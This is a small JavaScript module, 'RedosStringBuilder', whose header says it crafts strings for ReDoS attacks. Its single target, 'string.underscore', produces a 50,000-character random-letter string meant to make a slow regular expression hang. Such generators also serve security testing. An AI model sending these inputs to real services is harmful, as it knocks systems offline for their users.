/* RedosStringBuilder
 * Builds specially crafted strings for ReDoS attacks.
 * (c) 2019 David (daXXog) Volm ><> + + + <><
 * Released under Apache License, Version 2.0:
 * http://www.apache.org/licenses/LICENSE-2.0.html  
 */

/* UMD LOADER: https://github.com/umdjs/umd/blob/master/returnExports.js */
(function (root, factory) {
    if (typeof exports === 'object') {
        // Node. Does not work with strict CommonJS, but
        // only CommonJS-like enviroments that support module.exports,
        // like Node.
        module.exports = factory();
    } else if (typeof define === 'function' && define.amd) {
        // AMD. Register as an anonymous module.
        define(factory);
    } else {
        // Browser globals (root is window)
        root.RedosStringBuilder = factory();
  }
}(this, function() {
    var RedosStringBuilder;
    
    RedosStringBuilder = function(target) { //create a builder for the target function
        this.target = target;
    };

    //--constants
    RedosStringBuilder.SIZE = 50000; //target string length to generate
    RedosStringBuilder.UPPER = 'QWERTYUIOPASDFGHJKLZXCVBNM'; //uppercase alphas
    RedosStringBuilder.LOWER = 'qwertyuiopasdfghjklzxcvbnm'; //lowercase alphas
    RedosStringBuilder.MAX_ROLL = RedosStringBuilder.UPPER.length - 1;

    //--rng
    RedosStringBuilder.roll = function(max) { //return a number between 0 and MAX_ROLL
        return Math.floor((Math.random() * (RedosStringBuilder.MAX_ROLL + 1)) + 1) - 1;
    };

    //--build functions
    RedosStringBuilder.prototype.build = function() {
        switch(this.target) {
            case 'string.underscore':
                return (function() {
                    return (new Array(RedosStringBuilder.SIZE)).fill(0).map(function(v) {
                        return Math.round(Math.random()) ? RedosStringBuilder.UPPER.split('')[RedosStringBuilder.roll()] :  RedosStringBuilder.LOWER.split('')[RedosStringBuilder.roll()];
                    }).join("");
                })();
        }
    };

    return RedosStringBuilder;
}));
